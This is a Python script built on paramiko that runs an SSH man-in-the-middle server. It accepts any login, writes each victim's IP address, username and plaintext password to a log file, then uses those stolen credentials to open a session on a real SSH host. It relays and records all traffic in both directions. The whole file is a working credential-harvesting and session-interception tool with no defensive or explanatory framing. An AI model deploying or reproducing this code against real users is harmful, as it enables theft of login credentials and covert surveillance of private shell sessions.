
from binascii import hexlify
import threading
import socketserver
import logging
import paramiko
from paramiko.py3compat import u
import select

PORT = 3000
REMOTE_PORT = 22
LOG_FILE = 'sshmitm.log'
DENY_ALL = False
DOMAIN = "sshd"
# setup logging
logger = logging.getLogger("access.log")
logger.setLevel(logging.INFO)
lh = logging.FileHandler(LOG_FILE)
logger.addHandler(lh)


host_key = paramiko.RSAKey(filename='test_rsa.key')

print('Read key: ' + u(hexlify(host_key.get_fingerprint())))


class Server (paramiko.ServerInterface):

    def __init__(self, client_address):
        self.event = threading.Event()
        self.client_address = client_address

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        logger.info('IP: %s, User: %s, Password: %s' % (self.client_address[0],
                                                        username, password))
        if DENY_ALL is True:
            return paramiko.AUTH_FAILED
        self.password = password
        self.username = username

        return paramiko.AUTH_SUCCESSFUL

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def check_channel_pty_request(self, channel, term, width, height,
                                  pixelwidth, pixelheight, modes):
        return True


class SSHHandler(socketserver.StreamRequestHandler):
    def handle(self):
        try:
            t = paramiko.Transport(self.connection)
            t.add_server_key(host_key)
            server = Server(self.client_address)
            try:
                t.start_server(server=server)
            except paramiko.SSHException:
                print('*** SSH negotiation failed.')
                return

            # wait for auth
            chan = t.accept(20)
            if chan is None:
                t.close()
                return
            print('Authenticated!')

            self.client = paramiko.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.client.connect(DOMAIN, username=server.username,
                                password=server.password, port=REMOTE_PORT)
            chan2 = self.client.invoke_shell()

            while True:
                r, w, e = select.select([chan2, chan], [], [])
                if chan in r:
                    x = chan.recv(1024)
                    if len(x) == 0:
                        break
                    logger.info('%s' % x)
                    chan2.send(x)

                if chan2 in r:
                    x = chan2.recv(1024)
                    if len(x) == 0:
                        break
                    logger.info('%s' % x)
                    chan.send(x)

            server.event.wait(10)
            if not server.event.is_set():
                print('*** Client never asked for a shell.')
                t.close()
                return
            print(server.get_allowed_auths)
            chan.close()

        except Exception as e:
            print('*** Caught exception: ' + str(e.__class__) + ': ' + str(e))
        finally:
            try:
                t.close()
            except:
                pass


if __name__=="__main__":
    sshserver = socketserver.ThreadingTCPServer(("0.0.0.0", PORT), SSHHandler)
    sshserver.serve_forever()
